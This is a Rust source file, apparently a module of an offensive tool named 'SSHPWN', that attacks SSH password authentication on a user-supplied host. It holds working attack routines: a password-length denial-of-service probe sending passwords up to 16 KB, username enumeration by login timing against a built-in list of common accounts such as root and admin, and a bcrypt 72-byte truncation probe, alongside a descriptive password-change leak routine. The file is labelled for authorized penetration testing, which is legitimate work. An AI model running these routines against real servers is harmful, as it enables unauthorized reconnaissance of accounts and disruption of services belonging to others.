//! SSHPWN Auth Password Attack Module
//! 
//! Based on OpenSSH 10.0p1 auth2-passwd.c vulnerability analysis
//! 
//! AUTH2-PASSWD VULNERABILITIES (auth2-passwd.c):
//! - Password length not explicitly limited - potential DoS via long passwords (LOW)
//! - Password change information disclosure - server fingerprinting (INFO)
//! - Timing attack via mm_auth_password - user enumeration (MEDIUM)
//!
//! For authorized penetration testing only.

use anyhow::{anyhow, Result};
use colored::*;
use ssh2::Session;
use std::{
    io::Write,
    net::TcpStream,
    time::{Duration, Instant},
};

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   SSHPWN - Auth Password Attack Module                            ║".cyan());
    println!("{}", "║   Based on OpenSSH auth2-passwd.c vulnerability analysis          ║".cyan());
    println!("{}", "║                                                                   ║".cyan());
    println!("{}", "║   Attack Modes:                                                   ║".cyan());
    println!("{}", "║   1. Password Length DoS Test (sshpkt_get_cstring limit)          ║".cyan());
    println!("{}", "║   2. Password Change Information Leak                             ║".cyan());
    println!("{}", "║   3. Auth Timing Attack (mm_auth_password)                        ║".cyan());
    println!("{}", "║   4. Bcrypt Length Bypass Test (72-byte limit)                    ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════════════╝".cyan());
    println!();
}

/// Normalize target for connection
fn normalize_target(target: &str) -> String {
    let trimmed = target.trim();
    if trimmed.starts_with('[') && trimmed.contains(']') {
        trimmed.to_string()
    } else if trimmed.contains(':') && !trimmed.contains('.') {
        format!("[{}]", trimmed)
    } else {
        trimmed.to_string()
    }
}

/// Time a single authentication attempt
fn time_auth_attempt(host: &str, port: u16, username: &str, password: &str, timeout_secs: u64) -> Option<(f64, bool, String)> {
    let addr = format!("{}:{}", host, port);
    
    let start = Instant::now();
    
    let tcp = match TcpStream::connect_timeout(
        &addr.parse().ok()?,
        Duration::from_secs(timeout_secs),
    ) {
        Ok(s) => s,
        Err(e) => return Some((0.0, false, format!("Connect failed: {}", e))),
    };
    
    let _ = tcp.set_read_timeout(Some(Duration::from_secs(timeout_secs)));
    let _ = tcp.set_write_timeout(Some(Duration::from_secs(timeout_secs)));
    
    let mut sess = match Session::new() {
        Ok(s) => s,
        Err(e) => return Some((0.0, false, format!("Session failed: {}", e))),
    };
    
    sess.set_tcp_stream(tcp);
    if let Err(e) = sess.handshake() {
        return Some((start.elapsed().as_secs_f64(), false, format!("Handshake failed: {}", e)));
    }
    
    // Try authentication
    let auth_result = sess.userauth_password(username, password);
    let elapsed = start.elapsed().as_secs_f64();
    
    match auth_result {
        Ok(_) => Some((elapsed, sess.authenticated(), "OK".to_string())),
        Err(e) => Some((elapsed, false, format!("{}", e))),
    }
}

/// Password Length DoS Test
/// 
/// Vulnerability: auth2-passwd.c lines 60-66 - sshpkt_get_cstring() has no explicit limit
/// Very long passwords could cause DoS in downstream bcrypt (72-byte) or PAM modules
pub async fn attack_password_length_dos(
    host: &str,
    port: u16,
    username: &str,
    max_length: usize,
) -> Result<bool> {
    println!("{}", format!("[*] Password Length DoS Test on {}", host).cyan());
    println!("{}", "[*] Vulnerability: auth2-passwd.c sshpkt_get_cstring() no explicit limit".cyan());
    println!("{}", "[*] Testing password lengths that may cause downstream issues".cyan());
    println!();
    
    // Test progressively longer passwords
    let test_lengths = vec![
        64,      // Normal
        72,      // bcrypt limit
        128,     // Double bcrypt
        256,     // Moderate
        512,     // Large
        1024,    // Very large  
        2048,    // Huge
        4096,    // Extreme
        8192,    // Maximum test
        max_length.min(16384),
    ];
    
    println!("{}", "[*] Testing password lengths:".cyan());
    println!("{}", "[*] Note: bcrypt has 72-byte limit, longer passwords are truncated".dimmed());
    println!();
    
    let mut abnormal_behavior = Vec::new();
    let mut baseline_time: Option<f64> = None;
    
    for &len in &test_lengths {
        if len > max_length {
            break;
        }
        
        // Generate password of specified length
        let password: String = std::iter::repeat('A').take(len).collect();
        
        print!("  Testing {} bytes... ", len);
        let _ = std::io::stdout().flush();
        
        match time_auth_attempt(host, port, username, &password, 30) {
            Some((time, _success, msg)) => {
                // Set baseline from first test
                if baseline_time.is_none() {
                    baseline_time = Some(time);
                }
                
                let base = baseline_time.unwrap_or(time);
                let ratio = if base > 0.0 { time / base } else { 1.0 };
                
                if time > 10.0 {
                    println!("{}", format!("SLOW ({:.2}s) - {}", time, msg).yellow());
                    abnormal_behavior.push((len, time, msg));
                } else if ratio > 2.0 {
                    println!("{}", format!("SLOW ({:.2}s, {:.1}x baseline) - {}", time, ratio, msg).yellow());
                    abnormal_behavior.push((len, time, msg));
                } else {
                    println!("{}", format!("OK ({:.2}s) - {}", time, msg).green());
                }
            }
            None => {
                println!("{}", "Connection failed".red());
            }
        }
        
        // Small delay between tests
        std::thread::sleep(Duration::from_millis(500));
    }
    
    println!();
    println!("{}", "=== Password Length DoS Results ===".cyan().bold());
    
    if !abnormal_behavior.is_empty() {
        println!("{}", "[VULN] Abnormal behavior detected with long passwords:".red().bold());
        for (len, time, msg) in &abnormal_behavior {
            println!("  {} bytes: {:.2}s - {}", len, time, msg);
        }
        println!();
        println!("{}", "[*] Server may be vulnerable to password length DoS".yellow());
        println!("{}", "[*] Downstream PAM modules or bcrypt may have issues".cyan());
        Ok(true)
    } else {
        println!("{}", "[*] No significant timing variations detected".green());
        println!("{}", "[*] Server handles long passwords gracefully".cyan());
        Ok(false)
    }
}

/// Password Change Information Leak Test
/// 
/// Vulnerability: auth2-passwd.c line 69 - "password change not supported" logged
/// This reveals server configuration and confirms authentication reached password handler
pub async fn attack_password_change_leak(
    host: &str,
    port: u16,
) -> Result<bool> {
    println!("{}", format!("[*] Password Change Information Leak Test on {}:{}", host, port).cyan());
    println!("{}", "[*] Vulnerability: auth2-passwd.c logs 'password change not supported'".cyan());
    println!();
    
    println!("{}", "[*] Testing SSH password change behavior...".cyan());
    
    // Note: SSH2 password change is signaled by a flag in the packet
    // We can't easily test this with libssh2, but we can document the vulnerability
    
    println!();
    println!("{}", "=== Password Change Information Leak Analysis ===".cyan().bold());
    println!();
    println!("{}", "[*] Vulnerability Details:".yellow());
    println!("{}", "  When SSH2_MSG_USERAUTH_REQUEST contains password change flag:".dimmed());
    println!("{}", "  1. Server logs 'password change not supported' if unsupported".dimmed());
    println!("{}", "  2. This confirms authentication reached password handler".dimmed());
    println!("{}", "  3. Reveals server's password change configuration".dimmed());
    println!();
    println!("{}", "[*] Attack Vectors:".cyan());
    println!("{}", "  - Server fingerprinting via response timing".dimmed());
    println!("{}", "  - Configuration enumeration".dimmed());
    println!("{}", "  - Confirm valid authentication path reached".dimmed());
    println!();
    println!("{}", "[*] To test manually:".yellow());
    println!("{}", "  Use SSH client with password change support".dimmed());
    println!("{}", "  ssh -o KbdInteractiveAuthentication=yes target".dimmed());
    println!();
    println!("{}", "[INFO] This is an informational vulnerability".yellow());
    println!("{}", "[*] Direct exploitation requires custom SSH client".cyan());
    
    Ok(true)
}

/// Auth Timing Attack - User Enumeration via mm_auth_password timing
/// 
/// Vulnerability: auth2-passwd.c line 70 - Timing depends on downstream implementation
/// Different timing for valid vs invalid users enables enumeration
pub async fn attack_auth_timing(
    host: &str,
    port: u16,
    usernames: &[String],
    samples: usize,
) -> Result<Vec<String>> {
    println!("{}", format!("[*] Auth Timing Attack on {}", host).cyan());
    println!("{}", "[*] Vulnerability: auth2-passwd.c mm_auth_password timing".cyan());
    println!("{}", "[*] Testing timing differences between valid/invalid users".cyan());
    println!();
    
    // Get baseline timing with definitely invalid user
    let baseline_user = format!("nonexistent_{}_{}", std::process::id(), Instant::now().elapsed().as_nanos());
    
    println!("{}", "[*] Establishing baseline with invalid user...".cyan());
    
    let mut baseline_times = Vec::new();
    for i in 0..samples {
        let password = format!("invalid_{}_{}", std::process::id(), i);
        if let Some((time, _, _)) = time_auth_attempt(host, port, &baseline_user, &password, 15) {
            baseline_times.push(time);
        }
        std::thread::sleep(Duration::from_millis(200));
    }
    
    if baseline_times.is_empty() {
        println!("{}", "[-] Could not establish baseline".red());
        return Ok(Vec::new());
    }
    
    let baseline = baseline_times.iter().sum::<f64>() / baseline_times.len() as f64;
    let baseline_stddev = (baseline_times.iter()
        .map(|t| (t - baseline).powi(2))
        .sum::<f64>() / baseline_times.len() as f64).sqrt();
    
    println!("{}", format!("[*] Baseline: {:.3}s ± {:.3}s", baseline, baseline_stddev).cyan());
    println!();
    
    // Test empty password timing (potential gap per vulnerability #3)
    println!("{}", "[*] Testing empty password timing (potential mitigation gap)...".cyan());
    
    let mut empty_times = Vec::new();
    for _ in 0..samples {
        if let Some((time, _, _)) = time_auth_attempt(host, port, &baseline_user, "", 15) {
            empty_times.push(time);
        }
        std::thread::sleep(Duration::from_millis(200));
    }
    
    if !empty_times.is_empty() {
        let empty_avg = empty_times.iter().sum::<f64>() / empty_times.len() as f64;
        let diff = empty_avg - baseline;
        
        if diff.abs() > baseline_stddev * 2.0 {
            println!("{}", format!("[VULN] Empty password timing differs: {:+.3}s", diff).red().bold());
            println!("{}", "[*] Possible timing attack via empty password".yellow());
        } else {
            println!("{}", format!("[*] Empty password: {:.3}s (diff: {:+.3}s)", empty_avg, diff).dimmed());
        }
    }
    
    println!();
    println!("{}", "[*] Testing usernames...".cyan());
    
    let mut valid_users = Vec::new();
    let threshold = baseline_stddev * 3.0 + 0.1; // 3 sigma + 100ms
    
    for user in usernames {
        print!("\r[*] Testing: {}                    ", user);
        let _ = std::io::stdout().flush();
        
        let mut times = Vec::new();
        for i in 0..samples {
            let password = format!("invalid_test_{}_{}", std::process::id(), i);
            if let Some((time, _, _)) = time_auth_attempt(host, port, user, &password, 15) {
                times.push(time);
            }
            std::thread::sleep(Duration::from_millis(200));
        }
        
        if !times.is_empty() {
            let avg = times.iter().sum::<f64>() / times.len() as f64;
            let diff = avg - baseline;
            
            if diff.abs() > threshold {
                println!("\r{}", format!("[+] Potential valid user: {} (timing diff: {:+.3}s)", user, diff).green());
                valid_users.push(user.clone());
            }
        }
    }
    
    println!("\r                                        ");
    println!();
    println!("{}", "=== Auth Timing Results ===".cyan().bold());
    
    if valid_users.is_empty() {
        println!("{}", "[-] No valid users detected via timing".yellow());
        println!("{}", "[*] Server may have proper timing mitigation (fakepw/fake_password)".cyan());
    } else {
        println!("{}", format!("[+] Potentially valid users ({}):", valid_users.len()).green());
        for user in &valid_users {
            println!("    - {}", user.green());
        }
    }
    
    Ok(valid_users)
}

/// Bcrypt 72-byte Limit Bypass Test
/// 
/// Vulnerability: bcrypt only uses first 72 bytes of password
/// Passwords longer than 72 bytes are effectively truncated
pub async fn attack_bcrypt_truncation(
    host: &str,
    port: u16,
    username: &str,
    base_password: &str,
) -> Result<bool> {
    println!("{}", format!("[*] Bcrypt 72-byte Truncation Test on {}", host).cyan());
    println!("{}", "[*] Testing if server uses bcrypt with 72-byte password limit".cyan());
    println!();
    
    // bcrypt only uses first 72 bytes
    let truncation_point = 72;
    
    // If base password is shorter than 72, pad it
    let test_base: String = if base_password.len() < truncation_point {
        format!("{}{}", base_password, "A".repeat(truncation_point - base_password.len()))
    } else {
        base_password.chars().take(truncation_point).collect()
    };
    
    // Create variants that differ only after 72 bytes
    let password_72 = test_base.clone();
    let password_73 = format!("{}X", test_base);
    let password_100 = format!("{}{}", test_base, "X".repeat(28));
    
    println!("{}", format!("[*] Testing password variants (first 72 chars: '{}'...)", &test_base[..20.min(test_base.len())]).cyan());
    println!("{}", format!("  Password A: {} bytes (baseline)", password_72.len()).dimmed());
    println!("{}", format!("  Password B: {} bytes (differs at byte 73)", password_73.len()).dimmed());
    println!("{}", format!("  Password C: {} bytes (differs at bytes 73-100)", password_100.len()).dimmed());
    println!();
    
    // Test each password
    let passwords = vec![
        ("72-byte", &password_72),
        ("73-byte", &password_73),
        ("100-byte", &password_100),
    ];
    
    let mut results = Vec::new();
    
    for (name, password) in &passwords {
        print!("[*] Testing {} password... ", name);
        let _ = std::io::stdout().flush();
        
        match time_auth_attempt(host, port, username, password, 15) {
            Some((time, success, msg)) => {
                results.push((name.to_string(), time, success, msg.clone()));
                if success {
                    println!("{}", "SUCCESS".green().bold());
                } else {
                    println!("{}", format!("{:.2}s - {}", time, msg).dimmed());
                }
            }
            None => {
                println!("{}", "Connection failed".red());
            }
        }
        
        std::thread::sleep(Duration::from_millis(500));
    }
    
    println!();
    println!("{}", "=== Bcrypt Truncation Analysis ===".cyan().bold());
    
    // Check if timing is consistent (would indicate truncation)
    if results.len() >= 2 {
        let time_72 = results.get(0).map(|r| r.1).unwrap_or(0.0);
        let time_73 = results.get(1).map(|r| r.1).unwrap_or(0.0);
        let time_100 = results.get(2).map(|r| r.1).unwrap_or(0.0);
        
        let diff_73 = (time_73 - time_72).abs();
        let diff_100 = (time_100 - time_72).abs();
        
        if diff_73 < 0.1 && diff_100 < 0.1 {
            println!("{}", "[*] Timing consistent across all lengths".yellow());
            println!("{}", "[*] Server may be using bcrypt (72-byte truncation)".cyan());
            println!();
            println!("{}", "[!] Implication: Passwords >72 bytes provide no extra security".yellow().bold());
            println!("{}", "[*] Password 'AAAA...AAA' (72) == 'AAAA...AAAXXX' (75)".dimmed());
            return Ok(true);
        }
    }
    
    println!("{}", "[*] Timing varies - server may not use bcrypt or has different handling".cyan());
    println!("{}", "[*] Cannot confirm 72-byte truncation".dimmed());
    
    Ok(false)
}

/// Prompt helpers
fn prompt_default(message: &str, default: &str) -> Result<String> {
    print!("{} [{}]: ", message, default);
    std::io::stdout().flush()?;
    let mut input = String::new();
    std::io::stdin().read_line(&mut input)?;
    let trimmed = input.trim();
    if trimmed.is_empty() {
        Ok(default.to_string())
    } else {
        Ok(trimmed.to_string())
    }
}

fn prompt_optional(message: &str) -> Result<Option<String>> {
    print!("{} (leave empty to skip): ", message);
    std::io::stdout().flush()?;
    let mut input = String::new();
    std::io::stdin().read_line(&mut input)?;
    let trimmed = input.trim();
    if trimmed.is_empty() {
        Ok(None)
    } else {
        Ok(Some(trimmed.to_string()))
    }
}

fn prompt_yes_no(message: &str, default: bool) -> Result<bool> {
    let hint = if default { "Y/n" } else { "y/N" };
    print!("{} [{}]: ", message, hint);
    std::io::stdout().flush()?;
    let mut input = String::new();
    std::io::stdin().read_line(&mut input)?;
    let trimmed = input.trim().to_lowercase();
    match trimmed.as_str() {
        "" => Ok(default),
        "y" | "yes" => Ok(true),
        "n" | "no" => Ok(false),
        _ => Ok(default),
    }
}

/// Default usernames for timing attack
const DEFAULT_USERNAMES: &[&str] = &[
    "root", "admin", "user", "test", "guest",
    "ubuntu", "www-data", "daemon", "nobody",
    "mysql", "postgres", "oracle", "ftp", "ssh",
];

/// Main entry point
pub async fn run(target: &str) -> Result<()> {
    display_banner();
    
    let host = normalize_target(target);
    println!("{}", format!("[*] Target: {}", host).cyan());
    
    // Get port
    let port: u16 = prompt_default("SSH Port", "22")?.parse().unwrap_or(22);
    
    println!();
    println!("{}", "Select attack mode:".yellow().bold());
    println!("  1. Password Length DoS Test");
    println!("  2. Password Change Information Leak (Analysis)");
    println!("  3. Auth Timing Attack (User Enumeration)");
    println!("  4. Bcrypt 72-byte Truncation Test");
    println!("  5. Run All Attacks");
    println!();
    
    let mode = prompt_default("Attack mode", "3")?;
    
    match mode.as_str() {
        "1" => {
            let username = prompt_default("Username to test", "root")?;
            let max_len: usize = prompt_default("Maximum password length", "8192")?.parse().unwrap_or(8192);
            attack_password_length_dos(&host, port, &username, max_len).await?;
        }
        "2" => {
            attack_password_change_leak(&host, port).await?;
        }
        "3" => {
            let samples: usize = prompt_default("Samples per username", "3")?.parse().unwrap_or(3);
            
            // Get usernames
            let mut usernames: Vec<String> = Vec::new();
            
            if prompt_yes_no("Use default username list?", true)? {
                for user in DEFAULT_USERNAMES {
                    usernames.push(user.to_string());
                }
            }
            
            let custom = prompt_optional("Additional usernames (comma-separated)")?;
            if let Some(custom_users) = custom {
                for user in custom_users.split(',') {
                    let user = user.trim();
                    if !user.is_empty() && !usernames.contains(&user.to_string()) {
                        usernames.push(user.to_string());
                    }
                }
            }
            
            if usernames.is_empty() {
                return Err(anyhow!("No usernames to test"));
            }
            
            attack_auth_timing(&host, port, &usernames, samples).await?;
        }
        "4" => {
            let username = prompt_default("Username", "root")?;
            let base_password = prompt_default("Base password (will be padded to 72 chars)", "testpassword")?;
            attack_bcrypt_truncation(&host, port, &username, &base_password).await?;
        }
        "5" | _ => {
            println!();
            println!("{}", "=== Running All Auth Password Attacks ===".yellow().bold());
            
            println!();
            println!("{}", "--- Attack 1: Password Length DoS ---".cyan());
            let _ = attack_password_length_dos(&host, port, "root", 4096).await;
            
            println!();
            println!("{}", "--- Attack 2: Password Change Info Leak ---".cyan());
            let _ = attack_password_change_leak(&host, port).await;
            
            println!();
            println!("{}", "--- Attack 3: Auth Timing Attack ---".cyan());
            let usernames: Vec<String> = DEFAULT_USERNAMES.iter().map(|s| s.to_string()).collect();
            let _ = attack_auth_timing(&host, port, &usernames, 2).await;
            
            println!();
            println!("{}", "--- Attack 4: Bcrypt Truncation ---".cyan());
            let _ = attack_bcrypt_truncation(&host, port, "root", "testpassword").await;
        }
    }
    
    println!();
    println!("{}", "[*] Auth password attack module complete".green());
    
    Ok(())
}

